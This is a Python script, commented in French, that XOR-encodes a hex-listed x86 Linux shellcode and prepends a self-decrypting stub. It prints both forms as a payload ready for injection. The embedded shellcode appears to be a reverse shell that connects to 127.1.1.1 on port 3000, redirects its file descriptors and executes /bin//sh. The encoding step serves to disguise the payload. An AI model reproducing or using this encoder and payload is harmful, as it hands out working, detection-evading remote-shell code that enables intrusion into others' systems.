import re

# Reformate un bloc de string en ligne
def reformateShellcodeToLine(str_shellcode):
    delete_all_whitespace = re.compile(r"\s+")
    return delete_all_whitespace.sub(" ", str_shellcode).strip()

# shellcode_decrypt_for_decryption ==> eb 17 5e 31 c9 41 41 31 d2 8a 54 0e fe 30 54 0e ff 41 80 f9 {} 75 f0 eb 05 e8 e4 ff ff ff
''' 
jmp    function_to_decrypt_code                     ; eb 17
decrypt_code:
    pop    esi                                      ; 5e            ; adresse du label "code_encrypted"
    xor    ecx,ecx                                  ; 31 c9         ; ecx = 0
    inc ecx                                         ; 41            ; pour ne pas commencer au premier bytes
    inc ecx                                         ; 41            ; ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    instruction_decrypt_code:
        xor    edx,edx                              ; 31 d2         ; edx = 0
        mov    dl, BYTE PTR [esi+ecx*1-0x2]         ; 8a 54 0e fe   ; au commencement : 1er bytes
        xor    BYTE PTR [esi+ecx*1-0x1], dl         ; 30 54 0e ff   ; au commencement : 2ieme bytes
        inc ecx                                     ; 41            ; incrément ecx
    cmp cl, {}                                      ; 80 f9 {}      ; compare cl avec la taille du shellcode
    jne    instruction_decrypt_code                 ; 75 f0         ; boucle si cl != {}
    jmp    code_encrypted                           ; eb 05         ; sinon jmp vers le code label "code_encrypted"
function_to_decrypt_code:
    call   decrypt_code                             ; e8 e4 ff ff ff
code_encrypted:
    <encrypted_code>
'''

# shellcode = "31 c0 31 db 31 c9 68 7f 01 01 01 66 68 0b bd 66 b8 67 01 b3 02 66 53 41 31 d2 cd 80 89 c3 66 b8 6a 01 89 e1 b2 10 cd 80 50 68 6e 2f 73 68 68 2f 2f 62 69 04 03 89 c1 b0 3f 49 cd 80 75 f9 89 c8 b2 0b 92 8d 1c 24 89 e3 cd 80 40 31 db".lower()
shellcode = reformateShellcodeToLine("""
29 c0 
66 b8 67 01 
31 d2 
89 d1 
41
89 cb 
43
cd 80 
89 c3 
31 f6 
68 7f 01 01 01
29 c0 
66 bf b8 0b 
01 f7 
66 c1 c7 08 
66 57 
66 6a 02
66 b8 6a 01 
89 e1 
b2 10 
cd 80 
85 c0 
75 02 
eb 08 
46
83 fe 05
7e d4 
eb 1f 
50
68 6e 2f 73 68
68 2f 2f 62 69
04 03 
89 c1 
b0 3f 
49
cd 80 
75 f9 
89 c8 
b2 0b 
92
89 e3 
cd 80 
31 c0 
40
31 db 
cd 80 
""").lower()

print("length shellcode --> {}".format(hex(len(shellcode.split())+2))[-2:])
shellcode_decrypt_for_decryption = "eb 17 5e 31 c9 41 41 31 d2 8a 54 0e fe 30 54 0e ff 41 80 f9 {} 75 f0 eb 05 e8 e4 ff ff ff".format(hex(len(shellcode.split())+2)[-2:])

def intToStrHex(byte_code):
    byte_code = str(hex(byte_code))[2:]
    return '0'+byte_code if len(byte_code) == 1 else byte_code

# Permet de comparer la taille et les données de deux shellcodes différents.
def comparePaylaod(s1, s2):
    is_equal = True
    if(len(s1) != len(s2)):
        print("Les paylaod n'ont pas la même taille ({} -- {}).".format(len(s1.split(" ")), len(s2.split(" "))))
        return False
    
    for i in range(len(s1)):
        if(s1[i] != s2[i]):
            is_equal = False
            print("[{}] Erreur : {} != {}".format(i, s1[i], s2[i]))
    return is_equal

# Xor les données du shellcode en commencant par le dernier bytes.
# Exemple :  
# En clair : cd 80
# Chiffrement : cd (80 ^ cd) ==> cd 4d
# NB : Le premier bytes du shellcode n'est pas xoré sinon impossible de dé-xoré le shellcode
def encrypt(shellcode):
    shellcode_encode = ""
    shellcode = shellcode.split(" ")
    for i in range(len(shellcode)-1, 0, -1):
        byte_code = int(shellcode[i], 16)
        ########################################################################
        byte_code = byte_code ^ int(shellcode[i-1], 16)
        ########################################################################
        byte_code = intToStrHex(byte_code)
        shellcode_encode = byte_code + " " + shellcode_encode
    shellcode_encode = intToStrHex(int(shellcode[0], 16)) + " " + shellcode_encode
    return shellcode_encode[:-1]

# Dé-Xor le shellcode en commençant aux débuts.
def decrypt(shellcode):
    shellcode = shellcode.split(" ")
    shellcode_encode = shellcode[0]
    edx = shellcode[0]
    for i in range(1, len(shellcode)):
        byte_code = int(shellcode[i], 16)
        ########################################################################
        byte_code = byte_code ^ int(edx, 16)
        ########################################################################
        byte_code = intToStrHex(byte_code)
        edx = byte_code
        shellcode_encode = shellcode_encode + " " + byte_code
    return shellcode_encode

shellcode_enc = encrypt(shellcode)
shellcode_dec = decrypt(shellcode_enc)

print("[~] shellcode ==> {} -- {}\n".format(shellcode, len(shellcode.split(" "))))
print("[+] shellcode ==> {} -- {}\n".format(shellcode_enc, len(shellcode_enc.split(" "))))
print("[-] shellcode dec ==> {} -- {}\n".format(shellcode_dec, comparePaylaod(shellcode, shellcode_dec)))

print("\n\n")
if(comparePaylaod(shellcode, shellcode_dec)):
    print("\n\n")
    print(r"Plain text shellcode ==> \x{}".format(shellcode.replace(" ", r"\x")))
    print()
    print(r"shellcode to inject with encrypted payload ==> \x{}\x{}".format(shellcode_decrypt_for_decryption.replace(" ", r"\x"), shellcode_enc.replace(" ", r"\x")))
else:
    print("Impossible to decrypt the encrypted version.")